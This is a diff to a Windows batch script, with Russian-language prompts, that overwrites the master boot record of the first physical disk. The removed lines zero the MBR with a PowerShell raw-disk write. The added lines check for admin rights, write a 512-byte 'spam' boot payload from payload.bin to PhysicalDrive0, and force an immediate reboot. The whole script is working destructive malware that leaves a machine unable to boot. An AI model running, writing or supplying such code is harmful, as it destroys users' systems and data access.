@@ -2,22 +2,33 @@
 color 0c
 chcp 65001 > nul
 
-:choice
-set /p "ask=Вы точно хотите уничтожить MBR? (Y/N): "
-if /i "%ask%"=="Y" goto destroy
-if /i "%ask%"=="N" goto cancel
-echo Пожалуйста, введите Y или N.
-goto choice
+:: Проверка прав администратора
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Запусти скрипт от имени Администратора!
+    pause
+    exit
+)
+
+:ask
+echo ===================================================
+set /p "choice=ЗАПИСАТЬ АССЕМБЛЕРНЫЙ SPAM-MBR И ПЕРЕЗАГРУЗИТЬ? (Y/N): "
+echo ===================================================
+
+if /i "%choice%"=="Y" goto destroy
+if /i "%choice%"=="N" goto cancel
+goto ask
 
 :cancel
-echo Операция отменена.
+echo Отмена.
 pause
 exit
 
 :destroy
-echo Уничтожение MBR...
-powershell -Command "([io.file]::OpenWrite('\\.\PhysicalDrive0')).Write((New-Object byte[] 512), 0, 512)"
+echo Запись бинарного кода спама в MBR...
 
-:loop
-echo MBR! MBR! MBR!
-goto loop
+:: PowerShell читает готовый 512-байтовый бинарник payload.bin и зашивает в MBR
+powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload.bin'); $stream = [io.file]::OpenWrite('\\.\PhysicalDrive0'); $stream.Write($bytes, 0, 512); $stream.Close();"
+
+:: Мгновенный reboot для демонстрации эффекта
+shutdown /r /t 0
